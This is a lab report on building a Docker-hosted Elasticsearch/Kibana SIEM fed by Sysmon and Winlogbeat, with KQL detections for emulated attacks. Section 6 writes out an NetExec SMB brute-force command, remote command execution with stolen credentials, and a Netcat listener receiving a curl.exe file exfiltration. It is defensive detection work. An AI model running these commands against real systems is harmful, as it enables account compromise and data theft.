# Custom SIEM Architecture, Telemetry Ingestion & Threat Detection & Visualization Report

**Author:** Sourav Ranjan

**Date:** October 2026

**Engagement Type:** SOC Detection Engineering & SIEM Implementation Lab

**Core Technologies:** Elasticsearch 8.15.0, Kibana 8.15.0, Docker Desktop (WSL2), Microsoft Sysmon, Winlogbeat 8.15.0, Kali Linux, NetExec (`nxc`), Netcat

**Target Endpoint:** Windows 10 VM (Windows 10 Enterprise Evaluation)

**Adversary Node:** Kali Linux VM 
**SIEM Host Node:** Windows 11 Host 

---

## 1. Executive Summary & Project Objectives

The objective of this engineering project was to design, deploy, and validate a custom Security Information and Event Management (SIEM) detection pipeline capable of ingesting high-fidelity endpoint telemetry and visualizing critical security events in real time. Rather than relying on pre-packaged vendor alerts or static log files, I built an end-to-end ingestion and detection architecture to monitor three high-priority threat vectors: **Brute-Force Credential Access**, **Discovery & Privilege Escalation**, and **Command-and-Control (C2) Data Exfiltration**.

To accomplish this within the hardware constraints of a single physical workstation, I architected a hybrid environment combining containerized SIEM services (Elasticsearch and Kibana 8.15.0 running on Docker Desktop via WSL2) with isolated VirtualBox virtual machines. On the monitored Windows 10 target, I remediated native Windows logging blind spots by enabling granular system audit policies, deploying Microsoft Sysmon (`Sysmon64`), and configuring Winlogbeat 8.15.0 to ship operational event streams directly to the Elasticsearch cluster. Finally, I executed live adversary emulations from a Kali Linux machine and engineered custom Kibana Query Language (KQL) filters and Kibana Lens visualizations mapped directly to the **MITRE ATT&CK framework**.

---

## 2. Lab Architecture & Resource Optimization Strategy

Deploying an enterprise-grade SIEM platform alongside active attacker and victim virtual machines on a single laptop presents a major memory and CPU bottleneck. A traditional full-VM deployment (such as a standalone Security Onion appliance) requires 12 GB to 16 GB of dedicated RAM alone, leaving insufficient resources to run hypervisor guests simultaneously.

### 2.1 Containerized SIEM vs. Full Virtualization

To solve this hardware constraint, I decoupled the SIEM stack from the hypervisor and deployed Elasticsearch and Kibana directly on the Windows 11 host using **Docker Desktop** backed by **Windows Subsystem for Linux 2 (WSL2)**. Because Docker containers share the underlying WSL2 Linux kernel rather than booting a separate guest operating system with reserved static RAM, resource overhead was drastically reduced.

| Node Role | System / OS | IPv4 Address | Assigned Network Adapter | Key Services / Tools |
| --- | --- | --- | --- | --- |
| **SIEM Server (Host)** | Windows 11 + WSL2 (Ubuntu) | `192.168.56.1` | VirtualBox Host-Only Adapter | Docker Desktop 4.95.0, Elasticsearch 8.15.0 (`:9200`), Kibana 8.15.0 (`:5601`) |
| **Monitored Victim** | Windows 10 VM | `192.168.56.20` | Adapter 1: VirtualBox Host-Only (`192.168.56.0/24`); Adapter 2: NAT (Tooling downloads) | `Sysmon64`, `Winlogbeat 8.15.0`, SMB (`:445`), `curl.exe`, `fsutil` |
| **Adversary Node** | Kali Linux VM | `192.168.56.10` | VirtualBox Host-Only Adapter | NetExec (`nxc`), Netcat (`nc`), `curl` |

### 2.2 Provisioning Docker Desktop & WSL2 Engine

I initiated the host setup by installing Docker Desktop (v4.95.0) via the Windows Package Manager (`winget`) in the command prompt[cite: 42]:

```cmd
winget install Docker.DockerDesktop

```

![Image 1 - Installing Docker Desktop via Winget](./Images/Screenshot%202026-10-17%20203816.png)

Next, I provisioned the Windows Subsystem for Linux (WSL v3.0.3) and installed the default **Ubuntu** distribution via an elevated PowerShell prompt to serve as the backend execution engine for Docker:

```powershell
wsl --install

```

![Image 2 - Provisioning WSL2 and Ubuntu Distribution](./Images/Screenshot%202026-10-17%20205804.png)

Once the system rebooted and the Ubuntu UNIX account (`user`) was initialized, I launched the Docker Desktop GUI, verified that the container engine was actively running, and ran a test container (`hello-world` / `jolly_rhodes`) to confirm container lifecycle functionality.

![Image 3 - Verifying Docker Desktop Engine and Test Container](./Images/Screenshot%202026-10-17%20222035.png)

---

## 3. SIEM Stack Deployment & Network Engineering

### 3.1 Authoring the Docker Compose Specification

To orchestrate Elasticsearch and Kibana as interconnected services with persistent storage, I created a dedicated project directory (`C:\siem-lab`) and authored a `docker-compose.yml` configuration file in Visual Studio Code.

In this configuration, I pulled version `8.15.0` of both official Elastic images, set the cluster discovery mode to `single-node`, disabled X-Pack TLS/authentication (`xpack.security.enabled=false`) to streamline local lab telemetry ingestion, and mapped persistent volume storage (`esdata:/usr/share/elasticsearch/data`) so indexed logs would survive container restarts:

```yaml
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.15.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - ES_JAVA_OPTS=-Xms3g -Xmx3g
    ports:
      - "9200:9200"
    volumes:
      - esdata:/usr/share/elasticsearch/data

  kibana:
    image: docker.elastic.co/kibana/kibana:8.15.0
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    ports:
      - "5601:5601"
    depends_on:
      - elasticsearch

volumes:
  esdata:

```

![Image 4 - Authoring docker-compose.yml in VS Code](./Images/Screenshot%202026-10-17%20222721.png)

I then deployed the stack in detached mode from PowerShell:

```powershell
cd C:\siem-lab
docker compose up -d

```

Docker pulled both container images, created the bridge network `siem-lab_default` and volume `siem-lab_esdata`, and started `siem-lab-elasticsearch-1` and `siem-lab-kibana-1`.

![Image 5 - Deploying ELK Containers via Docker Compose](./Images/Screenshot%202026-10-17%20224031.png)

To confirm that the Elasticsearch REST API had initialized properly, I navigated to `http://localhost:9200` in the browser and verified the JSON cluster status response (`cluster_name: "docker-cluster"`, version `8.15.0`, Lucene version `9.11.1`)

![Image 6 - Validating Elasticsearch REST API Response on Port 9200](./Images/Screenshot%202026-10-17%20224657.png)

### 3.2 Host Firewall Configuration & Cross-Subnet Verification

By default, Windows Defender Firewall blocks inbound TCP connections originating from VirtualBox Host-Only networks (`192.168.56.0/24`), which prevents virtual machines from shipping logs to the host's Docker ports. To allow traffic into the SIEM, I executed two administrative PowerShell commands to open inbound TCP ports `9200` (Elasticsearch) and `5601` (Kibana):

```powershell
New-NetFirewallRule -DisplayName "ES 9200" -Direction Inbound -LocalPort 9200 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "Kibana 5601" -Direction Inbound -LocalPort 5601 -Protocol TCP -Action Allow

```

![Image 7 - Configuring Inbound Windows Firewall Rules for Ports 9200 and 5601](./Images/Screenshot%202026-10-17%20225157.png)

I then accessed `http://localhost:5601/app/home#/` to confirm the Kibana web interface was live and connected to the backend Elasticsearch engine[cite: 49].

![Image 8 - Kibana Web Interface Initialized on Port 5601](./Images/Screenshot%202026-10-17%20225401.png)

Next, I verified network reachability across the isolated `192.168.56.0/24` Host-Only subnet:

1. On the Windows 10 VM (`192.168.56.20`), I ran `ipconfig` and tested ICMP connectivity to both the host (`192.168.56.1`) and the Kali VM (`192.168.56.10`). While the ping to Kali (`192.168.56.10`) succeeded with `0% loss`, the ping to `192.168.56.1` timed out because Windows 11 drops inbound ICMP Echo Requests by default even when specific TCP ports are allowed.


2. To prove that application-layer TCP routing to the host SIEM was unaffected by the ICMP block, I ran `curl [http://192.168.56.1:9200](http://192.168.56.1:9200)` from the Kali Linux VM (`192.168.56.10`), which immediately returned the Elasticsearch cluster JSON payload. I also verified ICMP reachability from Kali to the Windows 10 target (`ping -c 4 192.168.56.20` with `0% packet loss`).



![Image 9 - Windows 10 VM IP Configuration and Subnet Ping Tests](./Images/Screenshot%202026-10-18%20005516.png)

![Image 10 - Verifying Host SIEM API Access and Target Reachability from Kali](./Images/Screenshot%202026-10-18%20005819.png)

---

## 4. Endpoint Hardening, Sysmon Integration & Telemetry Ingestion

Out-of-the-box Windows installations do not log failed logon specifics, command-line arguments of executed binaries, or granular outbound TCP connections. To transform the Windows 10 VM (`DESKTOP-6V6ANFI`) into a high-visibility sensor, I implemented a three-tier logging configuration.

### 4.1 Granular Windows Audit Policy & Command-Line Auditing

Using an elevated PowerShell prompt on the Windows 10 VM, I used `auditpol.exe` to enable both `success` and `failure` auditing across seven critical security subcategories, and modified the Windows Registry (`ProcessCreationIncludeCmdLine_Enabled`) so that full command-line arguments are recorded alongside process creation events:

```powershell
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Special Logon" /success:enable
auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable
auditpol /set /subcategory:"Process Creation" /success:enable
auditpol /set /subcategory:"User Account Management" /success:enable /failure:enable
auditpol /set /subcategory:"Security Group Management" /success:enable
auditpol /set /subcategory:"Other Object Access Events" /success:enable
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f

```

![Image 11 - Enabling Granular Audit Policies and Command-Line Logging via PowerShell](./Images/Screenshot%202026-10-19%20144532.png)

To prepare the endpoint for credential access testing, I provisioned a local user account named `testuser` with the password `Password123` and enabled Remote Desktop connections in the registry (`fDenyTSConnections = 0`):

```powershell
net user testuser "Password123" /add
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

```

![Image 12 - Provisioning Target User Account testuser on Windows 10](./Images/Screenshot%202026-10-19%20152706.png)

### 4.2 Microsoft Sysmon & Winlogbeat 8.15.0 Deployment

To capture deep kernel- and process-level telemetry—specifically **Sysmon Event ID 1 (Process Creation)** and **Sysmon Event ID 3 (Network Connection)**—I installed `Sysmon64` configured with the SwiftOnSecurity XML baseline and verified its active runtime state:

```powershell
Get-Service Sysmon64

```

![Image 13 - Verifying Sysmon64 Service Running Status](./Images/Screenshot%202026-10-19%20153339.png)

Next, I extracted **Winlogbeat 8.15.0** (`C:\winlogbeat\winlogbeat-8.15.0-windows-x86_64`) to act as the lightweight log shipper. I edited `winlogbeat.yml` to subscribe directly to the `Security` and `Microsoft-Windows-Sysmon/Operational` event channels and route all formatted JSON events to the host Elasticsearch socket (`[http://192.168.56.1:9200](http://192.168.56.1:9200)`):

```yaml
winlogbeat.event_logs:
  - name: Security
  - name: Microsoft-Windows-Sysmon/Operational

output.elasticsearch:
  hosts: ["http://192.168.56.1:9200"]

```

![Image 14 - Configuring winlogbeat.yml to Ship Security and Sysmon Telemetry](./Images/Screenshot%202026-10-19%20165527.png)

### 4.3 Indexing & Kibana Data View Creation

Once the Winlogbeat service began streaming events to Elasticsearch, I navigated to **Stack Management > Data Views** in Kibana and created the `winlogbeat` Data View matching the index pattern `winlogbeat-*` with `@timestamp` as the primary time filter, mapping **1,702 distinct fields**. Opening the **Discover** interface confirmed live telemetry flowing in from `agent.hostname: DESKTOP-6V6ANFI` (104 initial documents)[cite: 58].

![Image 16 - Creating the winlogbeat-* Data View in Kibana](./Images/Screenshot%202026-10-19%20185146.png)

![Image 17 - Verifying Real-Time Endpoint Telemetry in Kibana Discover](./Images/Screenshot%202026-10-19%20185256.png)

---

## 5. Engineering Challenges & Troubleshooting Post-Mortem

Building a custom SIEM pipeline across nested virtualization and container layers surfaced four practical engineering roadblocks that required systematic root-cause analysis:

1. **Docker JVM Heap Exhaustion & WSL2 Freeze:**
* **Symptom:** In my initial `docker-compose.yml` file, I allocated `3 GB` of JVM heap memory to Elasticsearch (`ES_JAVA_OPTS=-Xms3g -Xmx3g`). Once high-volume Sysmon telemetry began streaming from the Windows 10 VM while Kali Linux was simultaneously running, the host's physical RAM saturated. The WSL2 subsystem hung, causing Kibana to time out and Elasticsearch to drop incoming TCP connections.


* **Resolution:** I forcefully terminated the hung WSL2 instance from the host terminal (`wsl --shutdown`), edited `docker-compose.yml` to cap the Elasticsearch Java heap at a lean **1 GB** (`-Xms1g -Xmx1g`), and relaunched the stack. Memory utilization stabilized immediately without degrading indexing speed.


2. **Winlogbeat Service Immediate Stop (`Status: Stopped`):**
* **Symptom:** When installing and starting the Winlogbeat service via PowerShell (`install-service-winlogbeat.ps1` followed by `Start-Service winlogbeat`), the service failed to stay up and returned `Status: Stopped`.


* **Resolution:** Because Windows Services fail silently in the background, I executed Winlogbeat in foreground debug mode (`.\winlogbeat.exe -e -c .\winlogbeat.yml`) to stream standard error (`stderr`) directly to the console. This revealed YAML indentation sensitivity and connection timeouts caused by the WSL2 memory freeze described above. After stabilizing the Docker container and validating the YAML syntax, the background service ran continuously.



![Image 15 - Diagnosing the Winlogbeat Service Stopped State in PowerShell](./Images/Screenshot%202026-10-19%20172702.png)

3. **KQL Syntax Strictness & Field Mapping Nuances:**
* **Symptom:** While building dashboard panels, initial searches for executed commands returned zero hits despite the raw events existing in the index.
* **Resolution:** Inspecting the raw JSON documents revealed two critical nuances: first, Winlogbeat stores raw Sysmon command strings inside `winlog.event_data.CommandLine` and target IPs inside `winlog.event_data.DestinationIp`; second, Kibana Query Language (KQL) can fail or misinterpret queries when unquoted wildcards or improper field names are used. Standardizing queries to exact schema paths (e.g., `event.code: 1 AND curl.exe` or `event.code: 3 and winlog.event_data.DestinationIp: "192.168.56.10"`) resolved the issue.




4. **curl HTTP/0.9 Protocol Warning During Netcat Exfiltration:**
* **Symptom:** When using modern `curl.exe` on Windows 10 to `POST` a binary file to a raw Netcat listener (`nc -lvnp 8080`), `curl` output `curl: (1) Received HTTP/0.9 when not allowed`.


* **Analysis:** Because a raw Netcat socket simply ingests the incoming TCP stream into `/tmp/received.bin` without sending back a formal `HTTP/1.1 200 OK` status header, `curl` interprets any response/closure as legacy HTTP/0.9. Despite the client-side warning, the full TCP handshake and outbound data transmission completed across port `8080`, generating the exact Sysmon Event ID 3 network telemetry required for detection.





---

## 6. Adversary Emulation (Red Team) & Detection Engineering (Blue Team)

To validate the detection efficacy of the SIEM, I executed three live attack scenarios from the Kali Linux node (`192.168.56.10`) against the Windows 10 target (`192.168.56.20`) and engineered corresponding KQL detection queries in Kibana.

---

### Phase 1: Credential Access – SMB Brute-Force Attack

* **MITRE ATT&CK Mapping:** `T1110.001` (Brute Force: Password Guessing)
* **Red Team Execution:** On the Kali Linux machine, I created a username list (`users.txt` containing `testuser`) and a dictionary wordlist (`passwords.txt` containing `admin`, `123456`, `qwerty`, `Random1`, and `Password123`). I then launched an automated SMB authentication attack against port `445` on `192.168.56.20` using **NetExec (`nxc`)**:


```bash
echo "testuser" > users.txt
printf "admin\n123456\nqwerty\nRandom1\nPassword123\n" > passwords.txt
nxc smb 192.168.56.20 -u users.txt -p passwords.txt

```


NetExec enumerated the host (`Windows 10 / Server 2019 Build 19041 x64`, `name:DESKTOP-6V6ANFI`), generated rapid `STATUS_LOGON_FAILURE` responses across the invalid guesses, and compromised the account on the final attempt (`[+] DESKTOP-6V6ANFI\testuser:Password123`).



![Image 18 - Executing SMB Brute-Force Attack with NetExec on Kali Linux](./Images/Screenshot%202026-10-19%20191429.png)

* **Blue Team Detection & Telemetry:** Every failed authentication attempt over SMB generated a Windows Security **Event ID 4625** (An account failed to log on) on `DESKTOP-6V6ANFI`. Querying Kibana Discover with:


```kql
event.code: 4625

```


isolated all 5 failed logon documents clustered tightly at `19:13:24` on October 19, 2026, pinpointing the brute-force burst.



![Image 19 - Capturing Event ID 4625 Failed Logon Telemetry in Kibana Discover](./Images/Screenshot%202026-10-19%20191828.png)

---

### Phase 2: Discovery & Privilege Escalation Reconnaissance

* **MITRE ATT&CK Mapping:** `T1033` (System Owner/User Discovery) & `T1069.001` (Permission Groups Discovery: Local Groups)
* **Red Team Execution:** Using the compromised `testuser` credentials, I used NetExec from Kali to attempt remote privilege and local administrator group enumeration on the target endpoint:


```bash
nxc smb 192.168.56.20 -u testuser -p Password123 -x "whoami /priv && net localgroup administrators"

```


In addition, privileged command executions (including `curl.exe` payload staging) were executed on the endpoint to test process creation auditing.



![Image 20 - Executing Post-Authentication Reconnaissance via NetExec](./Images/Screenshot%202026-10-19%20192521.png)

* **Blue Team Detection & Telemetry:** While standard Windows logs lack granular process context, **Sysmon Event ID 1 (Process Creation)** captured every binary execution along with its full command-line parameters. Querying Kibana Discover for:


```kql
event.code: 1

```


returned 12 process creation documents across the attack window, exposing the exact binaries and command-line arguments invoked on `DESKTOP-6V6ANFI`.



![Image 21 - Detecting Process Creation via Sysmon Event ID 1 in Kibana Discover](./Images/Screenshot%202026-10-19%20193159.png)

---

### Phase 3: Command & Control – Data Exfiltration Over HTTP POST

* **MITRE ATT&CK Mapping:** `T1041` (Exfiltration Over C2 Channel) / `T1048.003` (Exfiltration Over Unencrypted Non-C2 Protocol)
* **Red Team Execution:** To simulate an attacker staging and exfiltrating sensitive corporate archives out of the network:
1. On the Kali Linux attacker node (`192.168.56.10`), I opened a raw Netcat listener on TCP port `8080` configured to redirect incoming binary streams into `/tmp/received.bin`:


```bash
nc -lvnp 8080 > /tmp/received.bin

```


2. On the Windows 10 victim (`192.168.56.20`), I used `fsutil` to generate a 5 MB (`5,000,000` bytes) dummy archive (`C:\secret.zip`) and exfiltrated it via an HTTP `POST` request using `curl.exe`:


```cmd
fsutil file createnew C:\secret.zip 5000000
curl.exe -X POST --data-binary @C:\secret.zip http://192.168.56.10:8080/upload

```




The Kali Netcat listener immediately registered the inbound socket connection (`connect to [192.168.56.10] from (UNKNOWN) [192.168.56.20] 50554`) and received the file stream.



![Image 22 - Staging Netcat Exfiltration Listener on Kali Linux Port 8080](./Images/Screenshot%202026-10-19%20194557.png)

![Image 23 - Creating 5MB Secret Payload and Exfiltrating via curl.exe on Windows 10](./Images/Screenshot%202026-10-19%20194720.png)

* **Blue Team Detection & Telemetry:** To hunt for unauthorized outbound data transfers, I queried **Sysmon Event ID 3 (Network Connection)** filtered by the external/attacker IP address:


```kql
event.code: 3 and winlog.event_data.DestinationIp: 192.168.56.10

```


Kibana immediately isolated the exact outbound network connection event at `19:43:35.939`, proving that `DESKTOP-6V6ANFI` initiated an unauthorized connection to `192.168.56.10`.



![Image 24 - Hunting Outbound Exfiltration via Sysmon Event ID 3 in Kibana Discover](./Images/Screenshot%202026-10-19%20195041.png)

---

## 7. Custom SIEM Dashboard Design & Visualization

Raw JSON logs in the Discover tab are effective for deep forensic queries, but SOC analysts require immediate visual situational awareness to triage incidents at a glance. Using **Kibana Lens**, I engineered three specialized visualization panels and consolidated them into a unified operational dashboard titled **`SIEM-Visualization-Lab`**.

| Panel Title | Visualization Type | KQL Detection Filter | Primary Aggregated Fields | Threat Vector Visualized |
| --- | --- | --- | --- | --- |
| **Failed Logons by IP** | Vertical Bar Chart | `event.code: 4625` | X-Axis: `@timestamp` (per minute); Breakdown: `winlog.event_data.IpAddress` | SMB / Network Brute-Force Attacks (`T1110`) |
| **Privilege Escalation Attempts (Sysmon)** | Data Table | `event.code: 1 AND curl.exe` | Rows: `host.name`, `winlog.event_data.CommandLine`; Metric: `Count of records` | Suspicious Process & Command Execution (`T1059` / `T1033`) |
| **Outbound Data Transfers** | Data Table | `event.code: 3 AND winlog.event_data.DestinationIp: "192.168.56.10"` | Rows: `winlog.event_data.DestinationIp`, `event.code`; Metric: `Count of records` | Unauthorized C2 & Data Exfiltration (`T1041`) |

### 7.1 Panel 1: Failed Logons by IP (Brute-Force Monitor)

Instead of a continuous line chart—which flattens or obscures short, high-intensity bursts of authentication failures—I configured a **Bar vertical** chart filtered to `event.code: 4625`. By setting the horizontal axis to `@timestamp per minute` and breaking down the vertical record count by the `Top 3 values of winlog.event_data.IpAddress`, the chart renders a bright red spike directly attributed to `192.168.56.10`, allowing an analyst to identify both the timing and source IP of a brute-force attack in seconds.

![Image 25 - Engineering the Failed Logons by IP Vertical Bar Chart in Kibana Lens](./Images/Screenshot%202026-10-19%20202106.png)

### 7.2 Panel 2: Privilege Escalation & Suspicious Execution Attempts (Sysmon Event 1)

To provide analysts with immediate visibility into malicious command-line activity without manually expanding JSON trees, I built a **Data Table** visualization filtered to `event.code: 1 AND curl.exe`. I configured the rows to display `host.name` (`DESKTOP-6V6ANFI`) alongside `winlog.event_data.CommandLine` (`curl.exe -X POST --data-binary @C:\...`), exposing the exact payload staging and exfiltration arguments executed on the host.

![Image 26 - Building the Sysmon Event ID 1 Command-Line Data Table in Kibana Lens](./Images/Screenshot%202026-10-19%20224347.png)

### 7.3 Panel 3: Outbound Data Transfers (Exfiltration Monitor)

To track unauthorized outbound network connections, I built a second **Data Table** targeting Sysmon Event ID 3 (`event.code:3 and winlog.event_data.DestinationIp : "192.168.56.10"`). Grouping rows by `winlog.event_data.DestinationIp` and `event.code` immediately flags any internal workstation establishing socket connections to suspicious or non-standard external IP addresses.

![Image 27 - Building the Outbound Data Transfers Table for Sysmon Event ID 3](./Images/Screenshot%202026-10-19%20224436.png)

### 7.4 Unified SOC Dashboard (`SIEM-Visualization-Lab`)

Finally, I assembled all three panels into the master **`SIEM-Visualization-Lab`** dashboard. This unified view correlates authentication anomalies (Event 4625), suspicious process executions (Sysmon Event 1), and unauthorized outbound network transfers (Sysmon Event 3) on a single screen.

![Image 28 - Final Completed SIEM-Visualization-Lab Dashboard in Kibana](./Images/Screenshot%202026-10-19%20224633.png)

---

## 8. Final Learnings, DFIR Takeaways & SOC Recommendations

Completing this end-to-end SIEM implementation from infrastructure provisioning to live attack detection provided several critical engineering insights:

* **The Necessity of Sysmon Over Native Windows Logging:** Standard Windows Security logs (such as Event ID 4625) are sufficient for detecting authentication failures, but they leave massive blind spots once an attacker lands on an endpoint. Integrating `Sysmon64` was the decisive factor in achieving deep visibility: **Event ID 1** exposed the exact command-line flags used to invoke `curl.exe`, and **Event ID 3** tied the outbound TCP connection directly to the attacker's IP (`192.168.56.10`).


* **Resource-Conscious Architecture & JVM Tuning:** Running enterprise tools like Elasticsearch on constrained hardware requires deliberate resource engineering. Moving the ELK stack off a traditional hypervisor VM and onto Docker Desktop (WSL2) saved gigabytes of guest OS overhead, while tuning the Elasticsearch JVM heap (`ES_JAVA_OPTS`) from `3g` down to `1g` proved that right-sizing memory allocations is essential for stability in multi-node lab environments.


* **Schema Mastery in Detection Engineering:** Writing reliable KQL queries requires understanding how shippers like Winlogbeat map raw Windows Event XML parameters into nested fields (`winlog.event_data.IpAddress`, `winlog.event_data.CommandLine`, and `winlog.event_data.DestinationIp`).


* **Recommended Defensive Remediations:**
1. **Automated SMB Account Lockout:** Enforce a local or Group Policy account lockout threshold (e.g., 5 invalid attempts within 10 minutes) to neutralize dictionary brute-force tools like NetExec (`nxc`).


2. **Egress Application Control:** Restrict native living-off-the-land binaries (LOLBins) such as `curl.exe` via Windows Defender Application Control (WDAC) or outbound host firewall rules so standard endpoints cannot POST arbitrary files to unverified external IP addresses.


3. **Automated SIEM Alerting:** Convert the three dashboard KQL queries (`event.code: 4625`, `event.code: 1`, and `event.code: 3`) into active Kibana Security Detection Rules that trigger real-time webhook or email alerts when threshold counts are exceeded.